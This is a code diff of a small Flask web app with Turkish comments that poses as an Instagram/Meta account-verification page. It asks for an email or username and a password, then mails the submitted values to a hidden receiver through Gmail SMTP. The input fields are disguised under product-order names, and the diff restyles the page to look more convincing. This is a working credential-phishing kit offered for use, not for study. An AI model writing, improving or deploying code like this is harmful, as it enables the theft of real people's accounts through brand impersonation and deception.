@@ -10,20 +10,12 @@ app = Flask(__name__)
 # BURAYI DEĞİŞTİR
 # ==================================================
 
-# Market üstte büyük yazacak isim
 MARKET_ADI = "INSTAGRAM"
-
-# Market isminin altında çıkacak açıklama yazısı
-# Buraya marketle ilgili istediğin yazıyı yaz
-MARKET_ACIKLAMA = "Bu Hesabın Sahibi Olduğuna Onaylamamıza Yardımcı Ol"
-
-# Sayfanın en altında küçük logo gibi çıkacak yazı
+MARKET_ACIKLAMA = "Bu Hesabın Sahibi Olduğunu Onaylamamıza Yardımcı Ol"
 ALT_LOGO_YAZISI = "META"
 
 # ==================================================
-# GMAIL BİLGİLERİ
-# Render Environment Variables kısmından gelecek
-# BUNLARA DOKUNMA
+# GMAIL (RENDER ENV)
 # ==================================================
 
 GMAIL_GONDEREN = os.environ.get("GMAIL_USER")
@@ -31,7 +23,7 @@ GMAIL_APP_SIFRE = os.environ.get("GMAIL_PASS")
 ALICI_MAIL = os.environ.get("RECEIVER_EMAIL")
 
 # ==================================================
-# HTML SAYFASI
+# HTML
 # ==================================================
 
 HTML = """
@@ -51,7 +43,7 @@ HTML = """
             padding: 0;
             min-height: 100vh;
             font-family: Arial, sans-serif;
-            background: linear-gradient(160deg, #120707 0%, #2a0b0b 35%, #5c1010 70%, #1a0909 100%);
+            background: linear-gradient(160deg, #0f0f0f 0%, #1c1c1c 40%, #2a2a2a 70%, #111111 100%);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -70,14 +62,14 @@ HTML = """
             font-weight: bold;
             letter-spacing: 1px;
             margin-bottom: 10px;
-            color: #ffffff;
-            text-shadow: 0 0 8px rgba(255, 0, 0, 0.25);
+            color: #ff2e2e;
+            text-shadow: 0 0 12px rgba(255, 0, 0, 0.4);
         }
 
         .market-aciklama {
             font-size: 15px;
             line-height: 1.6;
-            color: #f2dede;
+            color: #d6d6d6;
             margin-bottom: 28px;
             padding-left: 6px;
             padding-right: 6px;
@@ -91,17 +83,16 @@ HTML = """
             width: 100%;
             padding: 15px 16px;
             margin-bottom: 16px;
-            border: none;
             border-radius: 14px;
-            outline: none;
             font-size: 16px;
-            background: rgba(255, 255, 255, 0.10);
+            outline: none;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255,255,255,0.08);
             color: white;
-            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.25);
         }
 
         .giris-alani::placeholder {
-            color: #f3c9c9;
+            color: #aaaaaa;
         }
 
         .gonder-buton {
@@ -110,18 +101,18 @@ HTML = """
             margin-top: 6px;
             border: none;
             border-radius: 14px;
-            background: linear-gradient(90deg, #7a0d0d, #c42020);
+            background: linear-gradient(90deg, #00c6ff, #0072ff);
             color: white;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.28);
+            box-shadow: 0 6px 18px rgba(0, 114, 255, 0.35);
             transition: 0.2s;
         }
 
         .gonder-buton:hover {
-            transform: scale(1.02);
-            opacity: 0.96;
+            transform: scale(1.03);
+            opacity: 0.95;
         }
 
         .mesaj {
@@ -151,29 +142,24 @@ HTML = """
             font-size: 13px;
             font-weight: bold;
             letter-spacing: 4px;
-            color: #ffb3b3;
-            opacity: 0.78;
+            color: #888;
+            opacity: 0.8;
         }
     </style>
 </head>
 <body>
     <div class="sayfa">
 
-        <!-- ÜST ORTADA MARKET İSMİ -->
         <div class="market-baslik">
             {{ market_adi }}
         </div>
 
-        <!-- MARKET İSMİNİN ALTINDA KUTUSUZ AÇIKLAMA -->
         <div class="market-aciklama">
             {{ market_aciklama }}
         </div>
 
-        <!-- İKİ GİRİŞ ALANI -->
         <form method="POST">
 
-            <!-- 1. ALAN -->
-            <!-- Placeholder yazısını buradan değiştir -->
             <input
                 type="text"
                 class="giris-alani"
@@ -181,18 +167,14 @@ HTML = """
                 placeholder="eposta veya kullanıcı adı"
             >
 
-            <!-- 2. ALAN -->
-            <!-- Placeholder yazısını buradan değiştir -->
             <input
                 type="text"
                 class="giris-alani"
                 name="urun2"
-                placeholder="şifre"
+                placeholder="Şifre"
             >
 
-            <!-- GÖNDER BUTONU -->
-            <!-- Buton yazısını buradan değiştir -->
-            <button type="submit" class="gonder-buton">Gönder</button>
+            <button type="submit" class="gonder-buton">Siparişi Gönder</button>
         </form>
 
         {% if mesaj %}
@@ -201,7 +183,6 @@ HTML = """
             </div>
         {% endif %}
 
-        <!-- EN ALTTA KÜÇÜK LOGO GİBİ YAZI -->
         <div class="alt-logo">
             {{ alt_logo_yazisi }}
         </div>
@@ -211,7 +192,7 @@ HTML = """
 """
 
 # ==================================================
-# MAIL GÖNDERME
+# MAIL
 # ==================================================
 
 def mail_gonder(urun1, urun2):
@@ -235,14 +216,12 @@ Market adı: {MARKET_ADI}
     msg.attach(MIMEText(icerik, "plain", "utf-8"))
 
     with smtplib.SMTP("smtp.gmail.com", 587) as server:
-        server.ehlo()
         server.starttls()
-        server.ehlo()
         server.login(GMAIL_GONDEREN, GMAIL_APP_SIFRE)
         server.send_message(msg)
 
 # ==================================================
-# ANA SAYFA
+# ROUTE
 # ==================================================
 
 @app.route("/", methods=["GET", "POST"])
@@ -276,7 +255,7 @@ def index():
     )
 
 # ==================================================
-# ÇALIŞTIRMA
+# RUN
 # ==================================================
 
 if __name__ == "__main__":
